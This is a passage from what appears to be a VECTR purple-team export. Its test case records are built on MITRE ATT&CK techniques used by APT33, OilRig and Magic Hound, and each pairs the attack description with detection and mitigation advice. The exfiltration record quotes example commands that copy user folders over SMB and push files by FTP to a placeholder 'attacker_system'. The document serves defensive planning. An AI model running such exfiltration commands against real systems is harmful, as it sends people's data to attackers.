(2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015. http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/"],"mitreId":"T1107"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--73330084-c72e-4c86-ad5a-a5f7c331d154","vectrId":"73330084-c72e-4c86-ad5a-a5f7c331d154","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","templateId":"73330084-c72e-4c86-ad5a-a5f7c331d154","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Exfiltration Over Alternative Protocol","variant":"APT33 - Exfiltration Over Alternative Protocol - Empire - FTP","objective":"Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different channels could include Internet Web services such as cloud storage.\n\nAdversaries may leverage various operating system utilities to exfiltrate data over an alternative protocol. \n\nSMB command-line example:\n\n* <code>net use \\\\\\attacker_system\\IPC$ /user:username password && xcopy /S /H /C /Y C:\\Users\\\\* \\\\\\attacker_system\\share_folder\\</code>\n\nAnonymous FTP command-line example:(Citation: Palo Alto OilRig Oct 2016)\n\n* <code>echo PUT C:\\Path\\to\\file.txt | ftp -A attacker_system</code>\n\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n\n---\n[FTP](https://attack.mitre.org/software/S0095) is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data. (Citation: Wikipedia FTP)","command":"[APT33](https://attack.mitre.org/groups/G0064) has used FTP to exfiltrate files (separately from the C2 channel).Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.\n---\nEnforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.\n---\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.\n---\n[Empire](https://attack.mitre.org/software/S0363) can use Dropbox and GitHub for data exfiltration.\n---\n[FTP](https://attack.mitre.org/software/S0095) may be used to exfiltrate data separate from the main command and control protocol.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["001ff422-5ce9-9680-42ab-fe0247831238","76ca4ddf-5174-57a7-2842-70d5af62a25c"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776","relationship--a501c3c3-66f7-4128-bf47-b6bf816d5411","relationship--4867dbb4-1e1b-45f6-9070-8e2c0c303638","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","relationship--6f991c49-462a-4cb8-8096-15c77f7ccace","course-of-action--0e5bdf42-a7f7-4d16-a074-4915bd262f80","relationship--6eec2d79-1d59-459d-af33-b186ece9748b","course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d","relationship--7bdcd3e6-f741-4f62-9495-3111309adad8","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--98ec1cf2-91ed-4a5f-b653-1d60259d0b46","tool--cf23bf4a-e003-4116-bbae-1ea6c558d565","relationship--ac3ee298-bef0-4a52-9050-3dcef1701408","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/","Microsoft. (2004, February 6). Perimeter Firewall Design. Retrieved April 25, 2016. https://technet.microsoft.com/en-us/library/cc700828.aspx","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Wikipedia. (2016, June 15). File Transfer Protocol. Retrieved July 20, 2016. https://en.wikipedia.org/wiki/File_Transfer_Protocol"],"mitreId":"T1048"},"blueTeam":{"successfulDetectionBehaviors":["Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.","Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. For example, if services like FTP are not required for sending information outside of a network, then block FTP-related ports at the network perimeter. Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network. (Citation: TechNet Firewall Design) These actions will help reduce command and control and exfiltration path opportunities.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--74348829-cf4c-4399-b614-1d0f22fb8206","vectrId":"74348829-cf4c-4399-b614-1d0f22fb8206","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"74348829-cf4c-4399-b614-1d0f22fb8206","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Obfuscated Files or Information","variant":"Magic Hound - Obfuscated Files or Information","objective":"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.\n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)\n\nAnother example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware has used base64-encoded commands and files, and has also encrypted embedded strings with AES.Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10 to analyze commands after being processed/interpreted.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a","relationship--8087d99b-cc05-4e2a-abce-687eb726a9e7","relationship--9d329c02-3b9f-42cc-b88b-bbacb3e4e18c","course-of-action--a09375e5-63d2-4b65-8b0d-1cfe3e6304ca","relationship--ffa8f46b-615f-4b95-8ed5-90f86eaedd20","course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017. https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/","Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018. https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html","Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018. https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf","Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018. https://github.com/danielbohannon/Revoke-Obfuscation","Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018. https://github.com/itsreallynick/office-crackros","Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017. https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/","Saavedra-Morales, J., Sherstobitoff, R. (2018, January 6). Malicious Document Targets Pyeongchang Olympics. Retrieved April 10, 2018. https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/","Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018. https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/","White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018. https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/","Wikipedia. (2017, December 29). Duqu. Retrieved April 10, 2018. https://en.wikipedia.org/wiki/Duqu"],"mitreId":"T1027"},"blueTeam":{"successfulDetectionBehaviors":["Ensure logging and detection mechanisms analyze commands after being processed/interpreted, rather than the raw input. Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10 for this functionality. (Citation: Microsoft AMSI June 2015)\n\nMitigation of compressed and encrypted files sent over the network and through email may not be advised since it may impact normal operations.","Use signatures or heuristics to detect malicious software."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--749baeab-e35c-4c6f-81ea-443a262920a4","vectrId":"749baeab-e35c-4c6f-81ea-443a262920a4","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"749baeab-e35c-4c6f-81ea-443a262920a4","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Standard Cryptographic Protocol","variant":"APT33 - Standard Cryptographic Protocol - Pupy - Empire","objective":"Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[APT33](https://attack.mitre.org/groups/G0064) has used AES for encryption of command and control traffic.SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols.\n---\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.\n---\n[Pupy](https://attack.mitre.org/software/S0192)'s default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.\n---\n[Empire](https://attack.mitre.org/software/S0363) can use TLS to encrypt its C2 channel.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["76ca4ddf-5174-57a7-2842-70d5af62a25c","5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5","relationship--e053cb07-3e4d-41a1-85a6-38cd2ac0e6ea","relationship--2b631dee-68bd-4ae6-92fc-b3224d471890","course-of-action--7bb5fae9-53ad-4424-866b-f0ea2a8b731d","relationship--0304cc00-ec86-4b08-8e30-e771adf0d7f5","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--32ba984e-dbe9-4a8a-a1b7-16ba560d31d5","course-of-action--a766ce73-5583-48f3-b7c0-0bb43c6ef8c7","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--2d90749b-525e-4aa2-9df0-1d5677be0b25","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--e26cfb89-f796-4ba1-bf5c-4084b6479762","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Ackerman, G., et al. (2018, December 21). OVERRULED: Containing a Potentially Destructive Adversary. Retrieved January 17, 2019. https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html","Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016. http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840","Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016. https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html","Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for a DarkComet. Retrieved April 5, 2016. https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf"],"mitreId":"T1032"},"blueTeam":{"successfulDetectionBehaviors":["Break and inspect SSL/TLS sessions to look at encrypted web traffic for adversary activity.","Use intrusion detection signatures to block traffic at network boundaries.","Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often. (Citation: University of Birmingham C2)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--74d26099-8215-4b4d-9666-55335cd82ab2","vectrId":"74d26099-8215-4b4d-9666-55335cd82ab2","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"769c1759-3db5-486d-918a-67fbadee4787","templateId":"74d26099-8215-4b4d-9666-55335cd82ab2","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Spearphishing Link","variant":"OilRig - Spearphishing Link","objective":"Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has sent spearphising emails with malicious links to potential victims.Users can be trained to identify social engineering techniques and spearphishing emails with malicious links.\n---\nDetermine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba","relationship--8272bde7-817f-4cb4-b073-67859002d310","relationship--1c04a87c-6a12-4aaa-8ead-30cd22d7850d","course-of-action--ad7f983d-d5a8-4fce-a38c-b68eda61bf4e","relationship--93669ebc-ea8d-4f76-94c8-4f8d1679b123","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--541884aa-9ee9-4241-b556-c7885c12102b","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019. https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks","Lee, B., Falcone, R. (2018, February 23). OopsIE! OilRig Uses ThreeDollars to Deliver New Trojan. Retrieved July 16, 2018. https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/"],"mitreId":"T1192"},"blueTeam":{"successfulDetectionBehaviors":["Because this technique involves user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails with malicious links. Determine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk. Other mitigations can take place as [User Execution](https://attack.mitre.org/techniques/T1204) occurs.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--7a261492-9225-4f2e-a701-d90fbbb36369","vectrId":"7a261492-9225-4f2e-a701-d90fbbb36369","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"7a261492-9225-4f2e-a701-d90fbbb36369","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Service Discovery","variant":"OilRig - System Service Discovery - Tasklist - Net","objective":"Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist /svc\" using [Tasklist](https://attack.mitre.org/software/S0057), and \"net start\" using [Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as well. Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n---\nThe [Tasklist](https://attack.mitre.org/software/S0057) utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. (Citation: Microsoft Tasklist)\n---\nThe [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility)\n\n[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used <code>sc query</code> on a victim to gather information about services.[Tasklist](https://attack.mitre.org/software/S0057) can be used to discover services running on a system.\n---\nThe <code>net start</code> command can be used in [Net](https://attack.mitre.org/software/S0039) to find information about Windows services.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["b908f5c3-a12f-4e3f-b46e-6aa8a0b1aee3","f7ed4709-5abb-418a-b84b-8b947b41a96c"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa","relationship--4923be5e-dd24-4289-adca-e9dbf545b9c2","relationship--338cf92d-43a8-4fdd-948d-1a3bde10d917","course-of-action--d8787791-d22e-45bb-a9a8-251d8d0a1ff2","tool--2e45723a-31da-4a7e-aaa6-e01998a6788f","relationship--40c5a024-37db-478b-b90f-27f184bf8f60","tool--03342581-f790-4f03-ba41-e82e67392e23","relationship--1d36c3e8-238f-46c6-9b20-9fb4cb5c75ba","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","Microsoft. (2006, October 18). Net.exe Utility. Retrieved September 22, 2015. https://msdn.microsoft.com/en-us/library/aa939914","Microsoft. (n.d.). Tasklist. Retrieved December 23, 2015. https://technet.microsoft.com/en-us/library/bb491010.aspx","Savill, J. (1999, March 4). Net.exe reference. Retrieved September 22, 2015. http://windowsitpro.com/windows/netexe-reference"],"mitreId":"T1007"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs 